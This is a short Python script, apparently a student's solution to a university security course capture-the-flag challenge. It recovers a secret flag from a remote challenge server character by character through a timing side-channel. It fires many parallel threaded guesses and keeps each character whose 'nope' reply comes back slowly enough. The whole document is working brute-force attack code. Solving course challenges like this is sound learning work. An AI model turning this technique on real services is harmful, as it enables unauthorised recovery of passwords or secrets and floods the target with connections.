# z5206677 - Andrew Wong
# https://featherbear.github.io/UNSW-COMP6441/blog/post/plsdonthaq.me

import time
import socket
import threading
from random import randint

def attempt(flagArray, char):
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('plsdonthaq.me', 1007))
    s.sendall(("".join(flagArray) + char + "\n").encode())
    
    start = time.time()
    while True:
      data = s.recv(1024)
      if not data:
        continue
      data = data.decode()
      if "you win" in data:
        print("WE DID IT BOYS: " + "".join(flagArray) + char)
      if data == ".": continue
      if "\nnope\n" in data:
        end = time.time()
        s.close()
        if end - start >= 0.5 * (len(flagArray) + 1):
          flagArray.append(char)
          print("Got", "".join(flagArray))
        return
  except:
    # Probably a connection reset / connection refused
    pass

import string

def go(flag=[]):
  allThreads = []
  for letter in string.printable[:-5]:
    '''
    Uncomment here if you need to slow down the attempt rate
    '''
    # time.sleep(randint(1,100)/100)

    '''
    Uncomment here for verbose printing
    '''
    # print("  Trying", "".join(flag) + letter)


    t = threading.Thread(target = attempt, args = (flag, letter))
    t.daemon = True
    t.start()
    allThreads.append(t)
  print("Waiting for threads to complete")
  while any(map(lambda t: t.isAlive(), allThreads)):
    pass
  go(flag)

go()